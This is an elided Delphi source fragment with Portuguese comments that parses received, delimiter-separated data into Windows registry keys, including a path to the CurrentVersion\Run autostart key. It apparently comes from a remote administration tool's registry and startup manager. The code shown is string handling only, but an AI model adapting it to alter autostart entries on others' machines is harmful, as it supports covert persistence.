...
begin
  ...
  begin
    ...
    try
      ...
      begin
        TempStr := Copy(Recebido, 1, pos(RegeditDelimitador, Recebido) - 1);  //Nome da Chave + MasterDelimitador + Número + MasterDelimitador + #13#10
        Delete(Recebido, 1, pos(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, length(RegeditDelimitador));

        TempStr := Copy(TempStr, 1, pos(delimitadorComandos, TempStr) - 1);
  ...
  begin
    ...
    try
      ...
      while (Recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, pos(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, pos(RegeditDelimitador, Recebido) - 1);
        Delete(Recebido, 1, length(RegeditDelimitador));
  ...
  begin
    ...
    StartUpType := Copy(Recebido, 1, pos('|', Recebido) - 1) + '\Software\Microsoft\Windows\CurrentVersion\Run';
    delete(Recebido, 1, pos('|', Recebido));
...
begin
  ...
  if Copy(TempStr, 1, pos('\', TempStr) - 1) = 'HKLM' then
  begin
    Delete(TempStr, 1, pos('\', TempStr));
    TempStr := 'HKEY_LOCAL_MACHINE\' + TempStr;
  end else
  if Copy(TempStr, 1, pos('\', TempStr) - 1) = 'HKCU' then
  begin
    Delete(TempStr, 1, pos('\', TempStr));
...
begin
  ...
  begin
    ...
    HKEY := Copy(TempStr, 1, pos('\', TempStr) - 1);
    if HKEY = '' then exit;
    delete(TempStr, 1, pos('\', TempStr));
    SubKey := TempStr;
